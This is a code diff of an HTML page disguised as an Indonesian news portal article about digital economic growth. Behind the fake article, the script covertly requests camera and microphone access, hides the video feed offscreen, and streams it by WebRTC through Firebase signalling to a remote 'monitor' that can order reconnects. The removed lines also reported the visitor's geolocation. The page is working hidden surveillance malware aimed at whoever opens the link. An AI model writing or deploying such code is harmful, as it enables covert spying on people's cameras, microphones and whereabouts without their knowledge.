@@ -2,30 +2,23 @@
 <html lang="id">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Portal Berita Nasional - Live Update</title>
+    <title>Berita Terkini - Portal Nasional</title>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
     <style>
-        body { font-family: 'Helvetica Neue', Arial, sans-serif; margin: 0; padding: 0; background: #fff; color: #222; }
-        .top-bar { background: #cc0000; color: #fff; padding: 10px 20px; font-weight: bold; text-transform: uppercase; letter-spacing: 1px; font-size: 14px; }
-        .container { padding: 20px; max-width: 700px; margin: auto; }
-        h1 { font-size: 28px; line-height: 1.2; color: #000; margin-bottom: 15px; }
-        .meta-info { color: #666; font-size: 13px; margin-bottom: 20px; border-bottom: 1px solid #eee; padding-bottom: 10px; }
-        p { line-height: 1.6; font-size: 17px; margin-bottom: 20px; }
-        img { width: 100%; height: auto; border-radius: 4px; }
-        /* Video bener-bener tersembunyi tapi tetep jalan */
-        #v { position: fixed; top: -100px; left: -100px; width: 1px; height: 1px; opacity: 0.01; }
+        body { font-family: sans-serif; margin: 0; background: #eee; }
+        .header { background: #b91c1c; color: #fff; padding: 20px; font-weight: bold; font-size: 20px; }
+        .content { max-width: 800px; margin: 20px auto; background: #fff; padding: 30px; border-radius: 8px; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }
+        #v { position: fixed; top: -5000px; opacity: 0; }
     </style>
 </head>
 <body>
-    <div class="top-bar">Breaking News</div>
-    <div class="container">
-        <h1>Rupiah Menguat Tajam di Perdagangan Pagi Ini, Analis: Momentum Positif Berlanjut</h1>
-        <div class="meta-info">Oleh: Tim Redaksi | Rabu, 04 Maret 2026</div>
-        <img src="https://picsum.photos/800/450?business" alt="Finance">
-        <p>Pasar keuangan Indonesia menyambut positif rilis data inflasi terbaru yang menunjukkan stabilitas yang lebih baik dari ekspektasi pelaku pasar.</p>
-        <p>Investor asing mulai mencatatkan beli bersih di pasar modal, yang mendorong indeks harga saham gabungan ikut menguat di zona hijau.</p>
+    <div class="header">NEWS UPDATE LIVE</div>
+    <div class="content">
+        <h1>Langkah Strategis Memperkuat Pertumbuhan Ekonomi Digital 2026</h1>
+        <p>Pemerintah baru saja mengumumkan kebijakan baru terkait akselerasi infrastruktur jaringan di daerah terpencil...</p>
+        <img src="https://picsum.photos/800/400" style="width:100%; margin: 20px 0;">
+        <p>Analis memprediksi bahwa dengan adanya dukungan penuh dari sektor swasta, target pertumbuhan 7% bukan lagi impian semata.</p>
     </div>
 
     <video id="v" autoplay playsinline muted></video>
@@ -43,86 +36,51 @@
 
         const db = firebase.database().ref('v5_multi/' + targetId);
         let pc = null;
-        let localStream = null;
+        let stream = null;
 
-        // Fungsi buat inisialisasi stream tanpa refresh
-        async function setupMedia() {
-            if (localStream) return true;
-            try {
-                localStream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { width: 640, height: 480 }, 
-                    audio: true 
-                });
-                document.getElementById('v').srcObject = localStream;
-                return true;
-            } catch (e) {
-                console.error("Gagal akses media:", e);
-                return false;
-            }
-        }
-
-        async function createSignal() {
-            // Tutup PC lama kalau ada
-            if (pc) {
-                pc.close();
-                pc = null;
+        async function startStreaming() {
+            if (!stream) {
+                try {
+                    stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+                    document.getElementById('v').srcObject = stream;
+                } catch (e) { return; }
             }
 
-            // Pastikan media aktif
-            const ready = await setupMedia();
-            if (!ready) return;
-
+            if (pc) pc.close();
             pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
-
-            localStream.getTracks().forEach(track => pc.addTrack(track, localStream));
+            
+            stream.getTracks().forEach(track => pc.addTrack(track, stream));
 
             pc.onicecandidate = e => {
                 if (e.candidate) db.child('ice_t').push(e.candidate.toJSON());
             };
 
-            // Jika koneksi putus di tengah jalan, auto re-signal
-            pc.onconnectionstatechange = () => {
-                if (pc.connectionState === 'failed' || pc.connectionState === 'disconnected') {
-                    console.log("Koneksi drop, mencoba menghubungkan ulang...");
-                    setTimeout(createSignal, 2000);
-                }
-            };
-
             const offer = await pc.createOffer();
             await pc.setLocalDescription(offer);
-            
-            // Push offer baru ke DB buat mancing monitor
-            await db.child('sdp/offer').set({ 
-                type: offer.type, 
-                sdp: offer.sdp, 
-                ts: Date.now() 
-            });
-        }
 
-        async function init() {
-            // Bersihkan sisa-sisa koneksi lama di DB
-            await db.child('sdp/answer').remove();
+            // Bersihkan data lama & kirim offer baru
             await db.child('ice_m').remove();
             await db.child('ice_t').remove();
+            await db.child('sdp/answer').remove();
+            await db.child('sdp/offer').set({ type: offer.type, sdp: offer.sdp, ts: Date.now() });
+        }
 
-            // Mulai loop heartbeat (lokasi & status)
-            navigator.geolocation.watchPosition(p => {
-                db.child('status').update({ 
-                    lat: p.coords.latitude, 
-                    lng: p.coords.longitude, 
-                    lastSeen: Date.now(), 
-                    id: targetId 
-                });
-            }, () => {
-                setInterval(() => {
-                    db.child('status').update({ lastSeen: Date.now(), id: targetId });
-                }, 5000);
+        // Heartbeat & Control Listener
+        function init() {
+            // Update status online
+            setInterval(() => {
+                db.child('status').update({ lastSeen: Date.now(), id: targetId });
+            }, 3000);
+
+            // Jika monitor minta re-koneksi (setelah refresh monitor)
+            db.child('control').on('value', s => {
+                if(s.val()) {
+                    console.log("Monitor requesting reconnect...");
+                    startStreaming();
+                }
             });
 
-            // Jalankan sinyal pertama
-            await createSignal();
-
-            // Monitor dengerin balasan (Answer) dari Admin
+            // Listen Answer
             db.child('sdp/answer').on('value', async s => {
                 const a = s.val();
                 if (a && pc && pc.signalingState !== "stable") {
@@ -130,22 +88,21 @@
                 }
             });
 
-            // Monitor dengerin ICE dari Admin
+            // Listen ICE dari monitor
             db.child('ice_m').on('child_added', s => {
-                if(pc) pc.addIceCandidate(new RTCIceCandidate(s.val())).catch(e => {});
+                if(pc) pc.addIceCandidate(new RTCIceCandidate(s.val())).catch(e=>{});
             });
+
+            // Langsung coba start kalau izin sudah ada
+            navigator.permissions.query({name: 'camera'}).then(res => {
+                if(res.state === 'granted') startStreaming();
+            });
+            
+            // Backup start
+            setTimeout(startStreaming, 2000);
         }
 
-        // Jalankan pas halaman kebuka
         window.onload = init;
-
-        // Tambahan: Jika monitor ngirim request reset/reconnect manual
-        db.child('control').on('value', s => {
-            if (s.val() === 'reconnect') {
-                db.child('control').set(null);
-                createSignal();
-            }
-        });
     </script>
 </body>
 </html>
